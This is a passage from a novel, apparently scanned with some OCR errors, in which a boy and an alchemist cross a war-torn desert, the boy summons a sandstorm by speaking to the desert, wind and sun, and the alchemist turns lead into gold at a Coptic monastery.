asked.\n\n\"Perhaps, if you were in a laboratory of\nalchemy, this would be the right time\nto study the best way to understand the\nEmerald Tablet. But you are in the\ndesert. So immerse yourself in it. The\ndesert will give you an understanding\nof the world; in fact, anything on the\nface of the earth will do that. You don't\neven have to understand the desert: all\nyou have to do is contemplate a simple\ngrain of sand, and you will see in it all\nthe marvels of creation.\"\n\n\"How do I immerse myself in the\ndesert?”\n\n\"Listen to your heart. It knows all\nthings, because it came from the Soul\nof the World, and it will one day return\nthere.\"\n\nThey crossed the desert for another two\ndays in silence. The alchemist had\nbecome much more cautious, because\nthey were approaching the area where\nthe most violent battles were being\nwaged. As they moved along, the boy\ntried to listen to his heart.\n\nIt was not easy to do; in earlier times,\nhis heart had always been ready to tell\nits story, but lately that wasn't true.\nThere had been times when his heart\nspent hours telling of its sadness, and\nat other times it became so emotional\nover the desert sunrise that the boy had\nto hide his tears. His heart beat fastest\nwhen it spoke to the boy of treasure,\nand more slowly when the boy stared\nentranced at the endless horizons of the\ndesert. But his heart was never quiet,\neven when the boy and the alchemist\nhad fallen into silence.\n\n\"Why do we have to listen to our\nhearts?\" the boy asked, when they had\nmade camp that day.\n\n\"Because, wherever your heart is, that\nis where you'll find your treasure.\"\n\n\"But my heart is agitated,\" the boy\nsaid. \"It has its dreams, it gets\nemotional, and it's become passionate\nover a woman of the desert. It asks\nthings of me, and it keeps me from\nsleeping many nights, when I'm\nthinking about her.\"\n\n\"Well, that's good. Your heart is alive.\nKeep listening to what it has to say.\"\n\nDuring the next three days, the two\ntravelers passed by a number of armed\ntribesmen, and saw others on the\nhorizon. The boy's heart began to speak\nof fear. It told him stories it had heard\nfrom the Soul of the World, stories of\nmen who sought to find their treasure\nand never succeeded. Sometimes it\nfrightened the boy with the idea that he\nmight not find his treasure, or that he\nmight die there in the desert. At other\ntimes, it told the boy that it was\nsatisfied: it had found love and riches.\n\n\"My heart is a traitor,\" the boy said to\nthe alchemist, when they had paused to\nrest the horses. \"It doesn't want me to\ngo on.\"\n\n\"That makes sense,\" the alchemist\nanswered. \"Naturally it's afraid that, in\npursuing your dream, you might lose\neverything you've won.\"\n\n\"Well, then, why should I listen to my\nheart?\"\n\n\"Because you will never again be able\nto keep it quiet. Even if you pretend not\nto have heard what it tells you, it will\nalways be there inside you, repeating to\nyou what you're thinking about life and\nabout the world.\"\n\n\"You mean I should listen, even if it's\ntreasonous?\"\n\n\"Treason is a blow that comes\nunexpectedly. If you know your heart\nwell, it will never be able to do that to\nyou. Because you'll know its dreams\nand wishes, and will know how to deal\nwith them.\n\n\"You will never be able to escape from\nyour heart. So it's better to listen to\nwhat it has to say. That way, you'll\nnever have to fear an unanticipated\nblow.\"\n\nThe boy continued to listen to his heart\nas they crossed the desert. He came to\nunderstand its dodges and tricks, and to\naccept it as it was. He lost his fear, and\nforgot about his need to go back to the\noasis, because, one afternoon, his heart\ntold him that it was happy.\n\n۲\n\n\"Even though I complain sometimes,\nit said, \"it's because I'm the heart of a\nperson, and people's hearts are that\nway. People are afraid to pursue their\nmost important dreams, because they\nfeel that they don't deserve them, or\nthat they'll be unable to achieve them.\nWe, their hearts, become fearful just\nthinking of loved ones who go away\nforever, or of moments that could have\nbeen good but weren't, or of treasures\nthat might have been found but were\nforever hidden in the sands. Because,\nwhen these things happen, we suffer\nterribly.\"\n\n\"My heart is afraid that it will have to\nsuffer,\" the boy told the alchemist one\nnight as they looked up at the moonless\nsky.\n\n\"Tell your heart that the fear of\nsuffering is worse than the suffering\nitself. And that no heart has ever\nsuffered when it goes in search of its\ndreams, because every second of the\nsearch is a second's encounter with God\nand with eternity.”\n\n\"Every second of the search is an\nencounter with God,\" the boy told his\nheart. \"When I have been truly\nsearching for my treasure, every day\nhas been luminous, because I've known\nthat every hour was a part of the dream\nthat I would find it. When I have been\ntruly searching for my treasure, I've\ndiscovered things along the way that I\nnever would have seen had I not had\nthe courage to try things that seemed\nimpossible for a shepherd to achieve.\"\n\nSo his heart was quiet for an entire\nafternoon. That night, the boy slept\ndeeply, and, when he awoke, his heart\nbegan to tell him things that came from\nthe Soul of the World. It said that all\npeople who are happy have God within\nthem. And that happiness could be\nfound in a grain of sand from the\ndesert, as the alchemist had said.\nBecause a grain of sand is a moment of\ncreation, and the universe has taken\nmillions of years to create it.\n\"Everyone on earth has a treasure that\nawaits him,\" his heart said. \"We,\npeople's hearts, seldom say much about\nthose treasures, because people no\nlonger want to go in search of them.\nWe speak of them only to children.\nLater, we simply let life proceed, in its\nown direction, toward its own fate. But,\nunfortunately, very few follow the path\nlaid out for them—the path to their\ndestinies, and to happiness. Most\npeople see the world as a threatening\nplace, and, because they do, the world\nturns out, indeed, to be a threatening\nplace.\n\n\"So, we, their hearts, speak more and\nmore softly. We never stop speaking\nout, but we begin to hope that our\nwords won't be heard: we don't want\npeople to suffer because they don't\nfollow their hearts.\"\n\n\"Why don't people's hearts tell them to\ncontinue to follow their dreams?\" the\nboy asked the alchemist.\n\n\"Because that's what makes a heart\nsuffer most, and hearts don't like to\nsuffer.\"\n\nFrom then on, the boy understood his\nheart. He asked it, please, never to stop\nspeaking to him. He asked that, when\nhe wandered far from his dreams, his\nheart press him and sound the alarm.\nThe boy swore that, every time he\nheard the alarm, he would heed its\nmessage.\n\nThat night, he told all of this to the\nalchemist. And the alchemist\nunderstood that the boy's heart had\nreturned to the Soul of the World.\n\"So what should I do now?\" the boy\nasked.\n\n\"Continue in the direction of the\nPyramids,\" said the alchemist. \"And\ncontinue to pay heed to the omens.\nYour heart is still capable of showing\nyou where the treasure is.”\n\n\"Is that the one thing I still needed to\nknow?\"\n\n\"No,\" the alchemist answered. \"What\nyou still need to know is this: before a\ndream is realized, the Soul of the\nWorld tests everything that was learned\nalong the way. It does this not because\nit is evil, but so that we can, in addition\nto realizing our dreams, master the\nlessons we've learned as we've moved\ntoward that dream. That's the point at\nwhich most people give up. It's the\npoint at which, as we say in the\nlanguage of the desert, one\n\n‘dies of thirst just when the palm trees\nhave appeared on the horizon.\n\n\"Every search begins with beginner's\nluck. And every search ends with the\nvictor's being severely tested.\"\n\nThe boy remembered an old proverb\nfrom his country. It said that the\ndarkest hour of the night came just\nbefore the dawn.\n\n水\nOn the following day, the first clear\nsign of danger appeared. Three armed\ntribesmen approached, and asked what\nthe boy and the alchemist were doing\nthere.\n\n\"I'm hunting with my falcon,\" the\nalchemist answered.\n\n\"We're going to have to search you to\nsee whether you're armed,\" one of the\ntribesmen said.\n\nThe alchemist dismounted slowly, and\nthe boy did the same.\n\n\"Why are you carrying money?\" asked\nthe tribesman, when he had searched\nthe boy's bag.\n\"I need it to get to the Pyramids,\" he\nsaid.\n\nThe tribesman who was searching the\nalchemist's belongings found a small\ncrystal flask filled with a liquid, and a\nyellow glass egg that was slightly\nlarger than a chicken's egg.\n\n\"What are these things?\" he asked.\n\n\"That's the Philosopher's Stone and the\nElixir of Life. It's the Master Work of\nthe alchemists. Whoever swallows that\nelixir will never be sick again, and a\nfragment from that stone turns any\nmetal into gold.\"\n\nThe Arabs laughed at him, and the\nalchemist laughed along. They thought\nhis answer was amusing, and they\nallowed the boy and the alchemist to\nproceed with all of their belongings.\n\n\"Are you crazy?\" the boy asked the\nalchemist, when they had moved on.\n\"What did you do that for?\"\n\n\"To show you one of life's simple\nlessons,\" the alchemist answered.\n\"When you possess great treasures\nwithin you, and try to tell others of\nthem, seldom are you believed.\"\n\nThey continued across the desert. With\nevery day that passed, the boy's heart\nbecame more and more silent. It no\nlonger wanted to know about things of\nthe past or future; it was content\nsimply to contemplate the desert, and\nto drink with the boy from the Soul of\nthe World. The boy and his heart had\nbecome friends, and neither was\ncapable now of betraying the other.\n\nWhen his heart spoke to him, it was to\nprovide a stimulus to the boy, and to\ngive him strength, because the days of\nsilence there in the desert were\nwearisome. His heart told the boy what\nhis strongest qualities were: his\ncourage in having given up his sheep\nand in trying to live out his destiny,\nand his enthusiasm during the time he\nhad worked at the crystal shop.\nAnd his heart told him something else\nthat the boy had never noticed: it told\nthe boy of dangers that had threatened\nhim, but that he had never perceived.\nHis heart said that one time it had\nhidden the rifle the boy had taken from\nhis father, because of the possibility\nthat the boy might wound himself. And\nit reminded the boy of the day when he\nhad been ill and vomiting out in the\nfields, after which he had fallen into a\ndeep sleep. There had been two thieves\nfarther ahead who were planning to\nsteal the boy's sheep and murder him.\nBut, since the boy hadn't passed by,\nthey had decided to move on, thinking\nthat he had changed his route.\n\"Does a man's heart always help him?\"\nthe boy asked the alchemist.\n\n\"Mostly just the hearts of those who\nare trying to realize their destinies. But\nthey do help children, drunkards, and\nthe elderly, too.\"\n\n\"Does that mean that I'll never run into\ndanger?\"\n\n\"It means only that the heart does what\nit can,\" the alchemist said.\n\nOne afternoon, they passed by the\nencampment of one of the tribes. At\neach corner of the camp were Arabs\ngarbed in beautiful white robes, with\narms at the ready. The men were\nsmoking their hookahs and trading\nstories from the battlefield. No one\npaid any attention to the two travelers.\n\n\"There's no danger,\" the boy said, when\nthey had moved on past the\nencampment.\n\nThe alchemist sounded angry: \"Trust in\nyour heart, but never forget that you're\nin the desert. When men are at war\nwith one another, the Soul of the World\ncan hear the screams of battle. No one\nfails to suffer the consequences of\neverything under the sun.\"\n\nAll things are one, the boy thought.\nAnd then, as if the desert wanted to\ndemonstrate that the alchemist was\nright, two horsemen appeared from\nbehind the travelers.\n\n\"You can't go any farther,\" one of them\nsaid. \"You're in the area where the\ntribes are at war.\"\n\n\"I'm not going very far,\" the alchemist\nanswered, looking straight into the eyes\nof the horsemen. They were silent for a\nmoment, and then agreed that the boy\nand the alchemist could move along.\n\nThe boy watched the exchange with\nfascination. \"You dominated those\nhorsemen with the way you looked at\nthem,\" he said.\n\n\"Your eyes show the strength of your\nsoul,\" answered the alchemist.\n\nThat's true, the boy thought. He had\nnoticed that, in the midst of the\nmultitude of armed men back at the\nencampment, there had been one who\nstared fixedly at the two. He had been\nso far away that his face wasn't even\nvisible. But the boy was certain that he\nhad been looking at them.\n\nFinally, when they had crossed the\nmountain range that extended along the\nentire horizon, the alchemist said that\nthey were only two days from the\nPyramids.\n\n\"If we're going to go our separate ways\nsoon,\" the boy said, \"then teach me\nabout alchemy.\"\n\n\"You already know about alchemy. It is\nabout penetrating to the Soul of the\nWorld, and discovering the treasure\nthat has been reserved for you.\"\n\n\"No, that's not what I mean. I'm talking\nabout transforming lead into gold.\"\n\nThe alchemist fell as silent as the\ndesert, and answered the boy only after\nthey had stopped to eat.\n\n\"Everything in the universe evolved,\"\nhe said. \"And, for wise men, gold is the\nmetal that evolved the furthest. Don't\nask me why; I don't know why. I just\nknow that the Tradition is always right.\n\"Men have never understood the words\nof the wise. So gold, instead of being\nseen as a symbol of evolution, became\nthe basis for conflict.\"\n\n\"There are many languages spoken by\nthings,\" the boy said. \"There was a time\nwhen, for me, a camel's whinnying was\nnothing more than whinnying. Then it\nbecame a signal of danger. And,\nfinally, it became just a whinny again.\"\n\nBut then he stopped. The alchemist\nprobably already knew all that.\n\n\"T have known true alchemists,\" the\nalchemist continued. \"They locked\nthemselves in their laboratories, and\ntried to evolve, as gold had. And they\nfound the Philosopher's Stone, because\nthey understood that when something\nevolves, everything around that thing\nevolves as well.\n\n\"Others stumbled upon the stone by\naccident. They already had the gift, and\ntheir souls were readier for such things\nthan the souls of others. But they don't\ncount. They're quite rare.\n\n\"And then there were the others, who\nwere interested only in gold. They\nnever found the secret. They forgot that\nlead, copper, and iron have their own\ndestinies to fulfill. And anyone who\ninterferes with the destiny of another\nthing never will discover his own.\"\nThe alchemist's words echoed out like\na curse. He reached over and picked up\na shell from the ground.\n\n\"This desert was once a sea,\" he said.\n\"I noticed that,\" the boy answered.\n\nThe alchemist told the boy to place the\nshell over his ear. He had done that\nmany times when he was a child, and\nhad heard the sound of the sea.\n\n\"The sea has lived on in this shell,\nbecause that's its destiny. And it will\nnever cease doing so until the desert is\nonce again covered by water.\"\n\nThey mounted their horses, and rode\nout in the direction of the Pyramids of\nEgypt.\n\n水\n\nThe sun was setting when the boy's\nheart sounded a danger signal. They\nwere surrounded by gigantic dunes, and\nthe boy looked at the alchemist to see\nwhether he had sensed anything. But he\nappeared to be unaware of any danger.\nFive minutes later, the boy saw two\nhorsemen waiting ahead of them.\nBefore he could say anything to the\nalchemist, the two horsemen had\nbecome ten, and then a hundred. And\nthen they were everywhere in the\ndunes.\nThey were tribesmen dressed in blue,\nwith black rings surrounding their\nturbans. Their faces were hidden\nbehind blue veils, with only their eyes\nshowing.\n\nEven from a distance, their eyes\nconveyed the strength of their souls.\nAnd their eyes spoke of death.\n\n水\n\nThe two were taken to a nearby\nmilitary camp. A soldier shoved the\nboy and the alchemist into a tent where\nthe chief was holding a meeting with\nhis staff.\n\n\"These are the spies,\" said one of the\nmen.\n\n\"We're just travelers,\" the alchemist\nanswered.\n\n\"You were seen at the enemy camp\nthree days ago. And you were talking\nwith one of the troops there.”\n\n\"I'm just aman who wanders the desert\nand knows the stars,\" said the\nalchemist. \"I have no information\nabout troops or about the movement of\nthe tribes. I was simply acting as a\nguide for my friend here.\"\n\n\"Who is your friend?\" the chief asked.\n\n\"An alchemist,\" said the alchemist. \"He\nunderstands the forces of nature. And\nhe wants to show you his extraordinary\npowers.\"\n\nThe boy listened quietly. And fearfully.\n\n\"What is a foreigner doing here?\"\nasked another of the men.\n\n\"He has brought money to give to your\ntribe,\" said the alchemist, before the\nboy could say a word. And seizing the\nboy's bag, the alchemist gave the gold\ncoins to the chief.\n\nThe Arab accepted them without a\nword. There was enough there to buy a\nlot of weapons.\n\"What is an alchemist?\" he asked,\nfinally.\n\n\"Tt's aman who understands nature and\nthe world. If he wanted to, he could\ndestroy this camp just with the force of\nthe wind.\"\n\nThe men laughed. They were used to\nthe ravages of war, and knew that the\nwind could not deliver them a fatal\nblow. Yet each felt his heart beat a bit\nfaster. They were men of the desert,\nand they were fearful of sorcerers.\n\n\"T want to see him do it,\" said the chief.\n\n\"He needs three days,\" answered the\nalchemist. \"He is going to transform\nhimself into the wind, just to\ndemonstrate his powers. If he can't do\nso, we humbly offer you our lives, for\nthe honor of your tribe.\"\n\n\"You can't offer me something that is\nalready mine,\" the chief said,\narrogantly. But he granted the travelers\nthree days.\n\nThe boy was shaking with fear, but the\nalchemist helped him out of the tent.\n\n\"Don't let them see that you're afraid,\"\nthe alchemist said. \"They are brave\nmen, and they despise cowards.\"\n\nBut the boy couldn't even speak. He\nwas able to do so only after they had\nwalked through the center of the camp.\nThere was no need to imprison them:\nthe Arabs simply confiscated their\nhorses. So, once again, the world had\ndemonstrated its many languages: the\ndesert only moments ago had been\nendless and free, and now it was an\nimpenetrable wall.\n\n\"You gave them everything I had!\" the\nboy said. \"Everything I've saved in my\nentire life!\"\n\n\"Well, what good would it be to you if\nyou had t6 die?\" the alchemist\nanswered. \"Your money saved us for\nthree days. It's not often that money\nsaves a person's life.\"\nBut the boy was too frightened to listen\nto words of wisdom. He had no idea\nhow he was going to transform himself\ninto the wind. He wasn't an alchemist!\n\nThe alchemist asked one of the soldiers\nfor some tea, and poured some on the\nboy's wrists.\n\nA wave of relief washed over him, and\nthe alchemist muttered some words\nthat the boy didn't understand.\n\n\"Don't give in to your fears,\" said the\nalchemist, in a strangely gentle voice.\n\"If you do, you won't be able to talk to\nyour heart.\"\n\n\"But I have no idea how to turn myself\ninto the wind.\"\n\n\"If a person is living out his destiny, he\nknows everything he needs to know.\nThere is only one thing that makes a\ndream impossible to achieve: the fear\nof failure.”\n\n\"I'm not afraid of failing. It's just that I\ndon't know how to turn myself into the\n\nwind.\"\n\n\"Well, you'll have to learn; your life\ndepends on it.\"\n\n\"But what if I can't?\"\n\n\"Then you'll die in the midst of trying\nto realize your destiny. That's a lot\nbetter than dying like millions of other\npeople, who never even knew what\ntheir destinies were.\n\n\"But don't worry,\" the alchemist\ncontinued. \"Usually the threat of death\nmakes people a lot more aware of their\nlives.\"\n\n水\n\nThe first day passed. There was a major\nbattle nearby, and a number of\nwounded were brought back to the\ncamp. The dead soldiers were replaced\nby others, and life went on.\n\nDeath doesn't change anything, the boy\nthought.\n\"You could have died later on,\" a\nsoldier said to the body of one of his\ncompanions. \"You could have died\nafter peace had been declared. But, in\nany case, you were going to die.\"\n\nAt the end of the day, the boy went\nlooking for the alchemist, who had\ntaken his falcon out into the desert.\n\n\"I still have no idea how to turn myself\ninto the wind,\" the boy repeated.\n\n\"Remember what I told you: the world\nis only the visible aspect of God. And\nthat what alchemy does is to bring\nspiritual perfection into contact with\nthe material plane.\"\n\"What are you doing?\"\n\"Feeding my falcon.\"\n\n\"If I'm not able to turn myself into the\nwind, we're going to die,\" the boy said.\n\"Why feed your falcon?\"\n\n\"You're the one who may die,\" the\nalchemist said. \"I already know how to\nturn myself into the wind.\"\n\n水\n\nOn the second day, the boy climbed to\nthe top of a cliff near the camp. The\nsentinels allowed him to go; they had\nalready heard about the sorcerer who\ncould turn himself into the wind, and\nthey didn't want to go near him. In any\ncase, the desert was impassable.\n\nHe spent the entire afternoon of the\nsecond day looking out over the desert,\nand listening to his heart. The boy\nknew the desert sensed his fear. They\nboth spoke the same language.\n\n水\n\nOn the third day, the chief met with his\nofficers. He called the alchemist to the\nmeeting and said, \"Let's go see the boy\nwho turns himself into the wind.\"\n\n\"Let's,\" the alchemist answered.\n\nThe boy took them to the cliff where he\nhad been on the previous day. He told\nthem all to be seated.\n\n\"It's going to take a while,\" the boy\nsaid.\n\n\"We're in no hurry,\" the chief\nanswered. \"We are men of the desert.\"\n\nThe boy looked out at the horizon.\nThere were mountains in the distance.\nAnd there were dunes, rocks, and plants\nthat insisted on living where survival\nseemed impossible. There was the\ndesert that he had wandered for so\nmany months; despite all that time, he\nknew only a small part of it. Within\nthat small part, he had found an\nEnglishman, caravans, tribal wars, and\nan oasis with fifty thousand palm trees\nand three hundred wells.\n\n\"What do you want here today?\" the\ndesert asked him. \"Didn't you spend\nenough time looking at me yesterday?\"\n\n\"Somewhere you are holding the\nperson I love,\" the boy said. \"So, when\nI look out over your sands, I am also\nlooking at her. I want to return to her,\nand I need your help so that I can turn\nmyself into the wind.\"\n\n\"What is love?\" the desert asked.\n\n\"Love is the falcon's flight over your\nsands. Because for him, you are a green\nfield, from which he always returns\nwith game. He knows your rocks, your\n3 3\n\ndunes, and your mountains, and you are\n\ngenerous to him.\"\n\n\"The falcon's beak carries bits of me,\nmyself,\" the desert said. \"For years, I\ncare for his game, feeding it with the\nlittle water that I have, and then I show\nhim where the game is.\n\nAnd, one day, as I enjoy the fact that\nhis game thrives on my surface, the\nfalcon dives out of the sky, and takes\naway what I've created.\"\n\n\"But that's why you created the game in\nthe first place,\" the boy answered. \"To\nnourish the falcon. And the falcon then\nnourishes man. And, eventually, man\nwill nourish your sands, where the\ngame will once again flourish. That's\nhow the world goes.\"\n\n\"So is that what love is?\"\n\n\"Yes, that's what love is. It's what\nmakes the game become the falcon, the\nfalcon become man, and man, in his\nturn, the desert. It's what turns lead into\ngold, and makes the gold return to the\nearth.\"\n\n\"I don't understand what you're talking\nabout,\" the desert said.\n\n\"But you can at least understand that\nsomewhere in your sands there is a\nwoman waiting for me. And that's why\nI have to turn myself into the wind.\"\n\nThe desert didn't answer him for a few\nmoments.\n\nThen it told him, \"I'll give you my\nsands to help the wind to blow, but,\nalone, I can't do anything. You have to\nask for help from the wind.\"\n\nA breeze began to blow. The tribesmen\nwatched the boy from a distance,\ntalking among themselves ina\nlanguage that the boy couldn't\nunderstand.\n\nThe alchemist smiled.\n\nThe wind approached the boy and\ntouched his face. It knew of the boy's\ntalk with the desert, because the winds\nknow everything. They blow across the\nworld without a birthplace, and with no\nplace to die.\n\n\"Help me,\" the boy said. \"One day you\ncarried the voice of my loved one to\nme.\"\n\n\"Who taught you to speak the language\nof the desert and the wind?\"\n\n\"My heart,\" the boy answered.\n\nThe wind has many names. In that part\nof the world, it was called the sirocco,\nbecause it brought moisture from the\noceans to the east. In the distant land\nthe boy came from, they called it the\nlevanter, because they believed that it\nbrought with it the sands of the desert,\nand the screams of the Moorish wars.\nPerhaps, in the places beyond the\npastures where his sheep lived, men\nthought that the wind came from\nAndalusia. But, actually, the wind\ncame from no place at all, nor did it go\nto any place; that's why it was stronger\nthan the desert. Someone might one\nday plant trees in the desert, and even\nraise sheep there, but never would they\nharness the wind.\n\n\"You can't be the wind,\" the wind said.\n\"We're two very different things.\"\n\"That's not true,\" the boy said. \"I\nlearned the alchemist's secrets in my\ntravels. I have inside me the winds, the\ndeserts, the oceans, the stars, and\neverything created in the universe. We\nwere all made by the same hand, and\nwe have the same soul. I want to be\nlike you, able to reach every corner of\nthe world, cross the seas, blow away\nthe sands that cover my treasure, and\ncarry the voice of the woman I love.\"\n\n“T heard what you were talking about\nthe other day with the alchemist,\" the\nwind said.\n\n\"He said that everything has its own\ndestiny. But people can't turn\nthemselves into the wind.\"\n\n\"Just teach me to be the wind for a few\nmoments,\" the boy said. \"So you and I\ncan talk about the limitless\npossibilities of people and the winds.\"\n\nThe wind's curiosity was aroused,\nsomething that had never happened\nbefore. It wanted to talk about those\nthings, but it didn't know how to turn a\nman into the wind. And look how many\nthings the wind already knew how to\ndo! It created deserts, sank ships, felled\nentire forests, and blew through cities\nfilled with music and strange noises. It\nfelt that it had no limits, yet here was a\nboy saying that there were other things\nthe wind should be able to do.\n\n\"This is what we call love,\" the boy\nsaid, seeing that the wind was close to\ngranting what he requested. \"When you\nare loved, you can do anything in\ncreation. When you are loved, there's\nno need at all to understand what's\nhappening, because everything happens\nwithin you, and even men can turn\nthemselves into the wind. As long as\nthe wind helps, of course.\"\n\nThe wind was a proud being, and it was\nbecoming irritated with what the boy\nwas saying.\n\nIt commenced to blow harder, raising\nthe desert sands. But finally it had to\nrecognize that, even making its way\naround the world, it didn't know how to\nturn a man into the wind.\n\nAnd it knew nothing about love.\n\n\"In my travels around the world, I've\noften seen people speaking of love and\nlooking toward the heavens,\" the wind\nsaid, furious at having to acknowledge\nits own limitations.\n\n\"Maybe it's better to ask heaven.\"\n\n\"Well then, help me do that,\" the boy\nsaid. \"Fill this place with a sandstorm\nso strong that it blots out the sun. Then\nI can look to heaven without blinding\nmyself.”\nSo the wind blew with all its strength,\nand the sky was filled with sand. The\nsun was turned into a golden disk.\n\nAt the camp, it was difficult to see\nanything. The men of the desert were\nalready familiar with that wind. They\ncalled it the simum, and it was worse\nthan a storm at sea. Their horses cried\nout, and all their weapons were filled\nwith sand.\n\nOn the heights, one of the commanders\nturned to the chief and said, \"Maybe we\nhad better end this!\"\n\nThey could barely see the boy. Their\nfaces were covered with the blue\ncloths, and their eyes showed fear.\n\"Let's stop this,\" another commander\nsaid.\n\n\"I want to see the greatness of Allah,\"\nthe chief said, with respect. \"I want to\nsee how a man turns himself into the\nwind.\"\n\nBut he made a mental note of the\nnames of the two men who had\nexpressed their fear. As soon as the\nwind stopped, he was going to remove\nthem from their commands, because\ntrue men of the desert are not afraid.\n\n\"The wind told me that you know about\nlove \" the boy said to the sun. \"If you\nknow about love, you must also know\nabout the Soul of the World, because\nit's made of love.\"\n\n\"From where I am,\" the sun said, \"I can\nsee the Soul of the World. It\ncommunicates with my soul, and\ntogether we cause the plants to grow\nand the sheep to seek out shade. From\nwhere I am—and I'm a long way from\nthe earth—I learned how to love. I\nknow that if I came even a little bit\ncloser to the earth, everything there\nwould die, and the Soul of the World\nwould no longer exist. So we\ncontemplate each other, and we want\neach other, and I give it life and\nwarmth, and it gives me my reason for\nliving.\"\n\"So you know about love,\" the boy\nsaid.\n\n\"And I know the Soul of the World,\nbecause we have talked at great length\nto each other during this endless trip\nthrough the universe. It tells me that its\ngreatest problem is that, up until now,\nonly the minerals and vegetables\nunderstand that all things are one. That\nthere's no need for iron to be the same\nas copper, or copper the same as gold.\nEach performs its own exact function\nas a unique being, and everything\nwould be a symphony of peace if the\nhand that wrote all this had stopped on\nthe fifth day of creation.\n\"But there was a sixth day,\" the sun\nwent on.\n\n\"You are wise, because you observe\neverything from a distance,\" the boy\nsaid. \"But you don't know about love. If\nthere hadn't been a sixth day, man\nwould not exist; copper would always\nbe just copper, and lead just lead. It's\ntrue that everything has its destiny, but\none day that destiny will be realized.\nSo each thing has to transform itself\ninto something better, and to acquire a\nnew destiny, until, someday, the Soul\nof the World becomes one thing only.\"\n\nThe sun thought about that, and\ndecided to shine more brightly. The\nwind, which was enjoying the\nconversation, started to blow with\ngreater force, so that the sun would not\nblind the boy.\n\n\"This is why alchemy exists,\" the boy\nsaid. \"So that everyone will search for\nhis treasure, find it, and then want to be\nbetter than he was in his former life.\nLead will play its role until the world\nhas no further need for lead; and then\nlead will have to turn itself into gold.\n\n\"That's what alchemists do. They show\nthat, when we strive to become better\nthan we are, everything around us\nbecomes better, too.\"\n\n\"Well, why did you say that I don't\nknow about love?\" the sun asked the\nboy.\n\n\"Because it's not love to be static like\nthe desert, nor is it love to roam the\nworld like the wind. And it's not love to\nsee everything from a distance, like\nyou do. Love is the force that\ntransforms and improves the Soul of\nthe World. When I first reached\nthrough to it, I thought the Soul of the\nWorld was perfect. But later, I could\nsee that it was like other aspects of\ncreation, and had its own passions and\nwars. It is we who nourish the Soul of\nthe World, and the world we live in\nwill be either better or worse,\ndepending on whether we become\nbetter or worse. And that's where the\npower of love comes in. Because when\nwe love, we always strive to become\nbetter than we are.\"\n\n\"So what do you want of me?\" the sun\nasked.\n\n\"I want you to help me turn myself into\nthe wind,\" the boy answered.\n\n\"Nature knows me as the wisest being\nin creation,\" the sun said. \"But I don't\nknow how to turn you into the wind.\"\n\n\"Then, whom should I ask?\"\n\nThe sun thought for a minute. The wind\nwas listening closely, and wanted to\ntell every corner of the world that the\nsun's wisdom had its limitations. That\nit was unable to deal with this boy who\nspoke the Language of the World.\n\n\"Speak to the hand that wrote all,\" said\nthe sun.\n\nThe wind screamed with delight, and\nblew harder than ever. The tents were\nbeing blown from their ties to the\nearth, and the animals were being freed\nfrom their tethers. On the cliff, the men\nclutched at each other as they sought to\nkeep from being blown away.\n\nThe boy turned to the hand that wrote\nall. As he did so, he sensed that the\nuniverse had fallen silent, and he\ndecided not to speak.\n\nA current of love rushed from his heart,\nand the boy began to pray. It was a\nprayer that he had never said before,\nbecause it was a prayer without words\nor pleas. His prayer didn't give thanks\nfor his sheep having found new\npastures; it didn't ask that the boy be\nable to sell more crystal; and it didn't\nbeseech that the woman he had met\ncontinue to await his return. In the\nsilence, the boy understood that the\ndesert, the wind, and the sun were also\ntrying to understand the signs written\nby the hand, and were seeking to follow\ntheir paths, and to understand what had\nbeen written on a single emerald. He\nsaw that omens were scattered\nthroughout the earth and in space, and\nthat there was no reason or significance\nattached to their appearance; he could\nsee that not the deserts, nor the winds,\nnor the sun, nor people knew why they\nhad been created. But that the hand had\na reason for all of this, and that only\nthe hand could perform miracles, or\ntransform the sea into a desert... or a\nman into the wind. Because only the\nhand understood that it was a larger\ndesign that had moved the universe to\nthe point at which six days of creation\nhad evolved into a Master Work.\n\nThe boy reached through to the Soul of\nthe World, and saw that it was a part of\nthe Soul of God. And he saw that the\nSoul of God was his own soul. And that\nhe, a boy, could perform miracles.\n\n水\n\nThe simum blew that day as it had\nnever blown before. For generations\nthereafter, the Arabs recounted the\nlegend of a boy who had turned himself\ninto the wind, almost destroying a\nmilitary camp, in defiance of the most\npowerful chief in the desert.\n\nWhen the simum ceased to blow,\neveryone looked to the place where the\nboy had been.\n\nBut he was no longer there; he was\nstanding next to a sand-covered\nsentinel, on the far side of the camp.\n\nThe men were terrified at his sorcery.\nBut there were two people who were\nsmiling: the alchemist, because he had\nfound his perfect disciple, and the\nchief, because that disciple had\nunderstood the glory of God.\n\nThe following day, the general bade the\nboy and the alchemist farewell, and\nprovided them with an escort party to\naccompany them as far as they chose.\n\n水\n\nThey rode for the entire day. Toward\nthe end of the afternoon, they came\nupon a Coptic monastery. The\nalchemist dismounted, and told the\nescorts they could return to the camp.\n\n\"From here on, you will be alone,\" the\nalchemist said. \"You are only three\nhours from the Pyramids.\"\n\n\"Thank you,\" said the boy. \"You taught\nme the Language of the World.\"\n\n\"I only invoked what you already\nknew.\"\n\nThe alchemist knocked on the gate of\nthe monastery. A monk dressed in\nblack came to the gates. They spoke for\na few minutes in the Coptic tongue, and\nthe alchemist bade the boy enter.\n\"T asked him to let me use the kitchen\nfor a while,\" the alchemist smiled.\n\nThey went to the kitchen at the back of\nthe monastery. The alchemist lighted\nthe fire, and the monk brought him\nsome lead, which the alchemist placed\nin an iron pan. When the lead had\nbecome liquid, the alchemist took from\nhis pouch the strange yellow egg. He\nscraped from it a sliver as thin as a\nhair, wrapped it in wax, and added it to\nthe pan in which the lead had melted.\n\nThe mixture took on a reddish color,\nalmost the color of blood. The\nalchemist removed the pan from the\nfire, and set it aside to cool. As he did\nso, he talked with the monk about the\ntribal wars.\n\n\"I think they're going to last for a long\ntime,\" he said to the monk.\n\nThe monk was irritated. The caravans\nhad been stopped at Giza for some\ntime, waiting for the wars to end. \"But\nGod's will be done,\" the monk said.\n\n\"Exactly,\" answered the alchemist.\n\nWhen the pan had cooled, the monk\nand the boy looked at it, dazzled. The\nlead had dried into the shape of the\npan, but it was no longer lead. It was\ngold.\n\"Will I learn to do that someday?\" the\nboy asked.\n\n\"This was my destiny, not yours,\" the\nalchemist answered. \"But I wanted to\nshow you that it was possible.\"\n\nThey returned to the gates of the\nmonastery. There, the alchemist\nseparated the disk into four parts.\n\n\"This is for you,\" he said, holding one\nof the parts out to the monk. \"It's for\nyour generosity to the pilgrims.”\n\n\"But this payment goes well beyond\nmy generosity,\" the monk responded.\n\n\"Don't say that again. Life might be\nlistening, and give you less the next\ntime.”\n\nThe alchemist turned to the boy. \"This\nis for you. To make up for what you\ngave to the general.\"\n\nThe boy was about to say that it was\nmuch more than he had given the\ngeneral. But he kept quiet, 